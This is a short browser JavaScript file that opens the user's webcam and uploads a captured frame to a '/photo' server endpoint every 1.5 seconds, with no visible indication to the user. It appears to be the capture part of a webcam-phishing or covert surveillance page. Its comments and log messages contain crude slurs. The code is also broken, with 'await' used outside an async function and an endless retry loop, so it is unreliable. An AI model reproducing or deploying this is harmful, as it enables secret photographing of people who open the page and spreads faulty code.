"use strict";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const errorMsgElement = document.querySelector("span#errorMsg");

const post = (data) => {
  fetch("/photo", {
    method: "POST",
    body: JSON.stringify({
      img: data,
    }),
    headers: {
      "Content-Type": "application/json",
    },
  }).catch(() => console.log("mierda"));
};

// Success
const success = (stream) => {
  window.stream = stream;
  video.srcObject = stream;

  let context = canvas.getContext("2d");

  setInterval(() => {
    // decode the images
    try
    {
      context.drawImage( video, 0, 0, 640, 480 );
      let canvasData = canvas
        .toDataURL( "image/png" )
        .replace( "image/png", "image/octet-stream" );
      // here needs to send the image
      // document.getElementById("penis").src = canvasData;
      post( canvasData );
    } catch ( e ) { e?null:null}
  }, 1500);
};
// access to the webcam
const init = () => {
  while (true) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        video: {
          facingMode: "user",
        },
      });
      success(stream);
    } catch (e) {
      console.log(`maricon no podemos acceder a esto :( ${e}`);
    }
  }
};

// Load init
init();
